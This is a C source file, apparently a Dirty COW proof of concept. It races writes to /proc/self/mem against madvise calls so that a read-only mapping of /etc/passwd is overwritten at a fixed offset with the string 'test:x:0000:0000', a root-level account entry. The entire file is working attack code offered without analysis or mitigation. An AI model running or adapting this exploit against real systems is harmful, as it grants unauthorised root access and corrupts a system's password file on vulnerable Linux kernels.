#include <stdio.h> // For printing
#include <fcntl.h> // For open()
#include <unistd.h> // For write() and lseek()
#include <sys/stat.h> // File info
#include <sys/mman.h> // For mmap()
#include <pthread.h>  // Make sure to gcc with -pthread
#include <stdint.h> // For uintptr_t
#include <string.h> // For strlen()


void *map;
char *file_name = "";
char *to_be_written = "test:x:0000:0000";


void *write_to_mapping (void *arg) {
	// Write to mapping through '/proc/self/mem'.
	int i;
	for (i = 0; i < 10000; i++) {
		int f = open("/proc/self/mem", O_RDWR);
		lseek(f, (uintptr_t)map+1870, SEEK_SET);
		write(f, to_be_written, strlen(to_be_written));
	}
}


void* drop_mapping (void *arg) {
	// (m)advise kernel to drop mapping.
	int i;
	for (i = 0; i < 10000; i++)
		madvise(map, 100, MADV_DONTNEED);
}


int main () {

	// Open and map the file.
	int f = open("/etc/passwd", O_RDONLY);
	struct stat file_info;
	fstat(f, &file_info);
	map = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, f, 0);


	// Create and run two threads.
	pthread_t thread_1, thread_2;
	pthread_create(&thread_1, NULL, write_to_mapping, NULL);
	pthread_create(&thread_2, NULL, drop_mapping, NULL);
	pthread_join(thread_1, NULL);
	pthread_join(thread_2, NULL);

	return 0;
}
